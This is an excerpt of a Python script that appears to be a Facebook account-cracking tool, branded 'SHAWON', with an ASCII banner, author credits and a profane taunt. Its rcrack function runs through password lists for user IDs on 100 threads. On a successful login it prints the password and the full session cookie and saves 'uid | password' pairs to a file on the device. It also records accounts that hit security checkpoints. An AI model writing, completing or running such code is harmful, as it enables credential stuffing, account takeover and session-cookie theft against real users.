...
logo=("""
_____ __  _____ _       ______  _   __
   / ___// / / /   | |     / / __ \/ | / /
   \__ \/ /_/ / /| | | /| / / / / /  |/ / 
  ___/ / __  / ___ | |/ |/ / /_/ / /|  /  
 /____/_/ /_/_/  |_|__/|__/\____/_/ |_/                                                                                                                
 _____ _   _  ______ ___________ _____ 
|  _  | \ | | |  ___|_   _| ___ \  ___|
| | | |  \| | | |_    | | | |_/ / |__  
| | | | . ` | |  _|   | | |    /|  __| 
\ \_/ / |\  | | |    _| |_| |\ \| |___ 
...
---------------------------------------------------
AUTHOR    : PRINCE SHAWON 
FACEBOOK  : MD SABBIR AHMED SHAWON
TYPE TYPE : PIAD
VERSION   : 8.0.0
SHAWON IS ONLY ONE NO TIME TO FUCK YOU 
---------------------------------------------------
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def mueor():
    ...
    with ThreadPool(max_workers=100) as MUEOR:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY SHAWON  ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSHAWON-XYZ\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SHAWON-XYZ-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/SHAWON-XYZ-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SHAWON-XYZ-CP💔] {uid} • {ps}")
